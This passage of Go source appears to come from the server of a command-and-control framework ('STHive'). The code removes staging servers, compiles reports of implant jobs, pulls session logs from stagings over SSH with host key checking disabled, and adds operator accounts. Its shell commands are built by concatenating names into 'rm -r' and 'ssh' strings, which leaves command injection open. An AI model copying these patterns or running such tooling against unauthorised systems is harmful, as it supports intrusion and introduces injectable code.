		mkdir := exec.Command("/bin/sh","-c","rm -r "+stagingFolder)
		mkdir.Start()
		mkdir.Wait()
		return errSet1.Error()

	}

	if (errSet2 != nil) {
		destroyStagingInfra(stagingName)
		mkdir := exec.Command("/bin/sh","-c","rm -r "+stagingFolder)
		mkdir.Start()
		mkdir.Wait()
		return errSet2.Error()

	}

	return ""

}

/*
Description: Main Remove Staging Asset Function
Flow:
A.Start the routine to destroy the server with terraform
B.Remove staging folder
C.Liberate assets like used domains
D.Remove staging from DB
*/
func removeStaging(stagingName string) string{

	//Remove infra, if sucessful, remove DB row
	resRemove := destroyStagingInfra(stagingName)
	if resRemove != "Done"{
		return resRemove
	}
	mkdir := exec.Command("/bin/sh","-c","rm -r /usr/local/STHive/stagings/"+stagingName)
	mkdir.Start()
	mkdir.Wait()
	dname,_,_ := getDomainNbyStagingNameDB(stagingName)
	
	errSet1 := setUsedDomainDB(dname,"No")
	errSet2 := rmStagingDB(stagingName)
	if (errSet1 != nil) || (errSet2 != nil) {
		return errSet1.Error()
	}

	if (errSet2 != nil) {
		return errSet2.Error()
	}

	return "Done"
}


/*
Description: Function to generate Reports
Flow:
A.Get names from the objects related to the report (jobs,implants and stagings)
B.Start crafting the string to be printed in a file:
	B1.Jobs from Hive and from Implants
	B2.Connect to every active staging and retrieve logs
C.Save string within DB
*/
func createReport(reportName string) string{

	var report,implantH string
	var bids []string
	//Get DB Data
	err,jobs := getJobsDB()
	err,implants := getImplantsNameDB()
	err,stagings := getStagingsNameDB() 

	if err != nil {
		return err.Error()
	}

	//Header
	report =
		fmt.Sprintf(
		`
		Report: %s

		`,reportName)

	//Set a timestamp
	time := time.Now().Format("02/01/2006 15:04:05 MST")
	timeS :=
		fmt.Sprintf(
		`
		Creation Time: %s

		`,time)

	report = report + timeS

	hiveJH :=
		fmt.Sprintf(
		`
		Hive Jobs:

		`)

	report = report + hiveJH
	//Hive Jobs and Logs
	for _,job := range jobs{
		if (job.Pid == "Hive"){
			report = report + fmt.Sprintf(
			`
			%s | %s | %s | %s

			%s

			%s

			`,job.Cid,job.Job,job.Time,job.Status,job.Parameters,job.Result)

		}
	}

	//Per implant jobs and logs
	for _,implant := range implants{
		implantH =
			fmt.Sprintf(
			`
			Implant < %s > Jobs:

			`,implant)
		report = report + implantH
		err,bids = getBidsImplantDB(implant)
		if err != nil {
			return err.Error()
		}
		for _,bid := range bids{
			for _,job := range jobs{
				if (job.Chid == bid){
					report = report + fmt.Sprintf(
					`
					%s | %s | %s | %s

					%s

					%s

					`,job.Cid,job.Job,job.Time,job.Status,job.Parameters,job.Result)
				}
			}
		}
	}
	//Go over Stagings and pull interactive data
	var errS,interactiveS string
	for _,staging := range stagings{

		errS,interactiveS = getStagingLog(staging)
		if errS != ""{
			return errS
		}

		report = report + fmt.Sprintf(
		`
		Staging < %s > interactive session:

		%s

		`,staging,interactiveS)
	}

	//Save crafted string on DB
	err = addReportDB(reportName,report)
	if err != nil {
		return err.Error()
	} 
	
	return ""
}


/*
Description: Used by createReport, connect to stagings and retrieve logs
Flow:
A.Using staging Name get the target domain to connect
B.Craft the Path to the target staging pem key
C.SSH connect and retrieve logs
*/
func getStagingLog(stagingName string) (string,string){

	//Get Domain
	domain,err,err2 := getDomainbyStagingDB(stagingName)
	domainName,err,err2 := getDomainNbyStagingNameDB(stagingName)
	if (err != nil) || (err2 !=nil){
		return err.Error()+err2.Error(),""
	}

	//Craft Keypath with Domain Name

	keypath := "/usr/local/STHive/stagings/"+stagingName+"/"+domainName+".pem"

	var outbuf,errbuf bytes.Buffer
	interactiveS :=  exec.Command("/bin/sh","-c", "ssh -oStrictHostKeyChecking=no -i "+keypath+" ubuntu@"+domain+" /bin/cat /home/ubuntu/*.log")
	interactiveS.Stdout = &outbuf
	interactiveS.Stderr = &errbuf
	
	interactiveS.Start()
	interactiveS.Wait()


	//Result will be stdout,if stderr return error
	return "",outbuf.String()

}

/*
Description: Main Function to add Users/Operators
Flow:
A.Generate a CID
B.Add user to DB (password will be hashed)
*/
func addUser(username string,password string) (string,string){

	genId := fmt.Sprintf("%s%s","C-",randomString(8))
	err := addUserDB(genId,username,password)
	if err != nil {
		return err.Error(),""
	}
	return "",""
}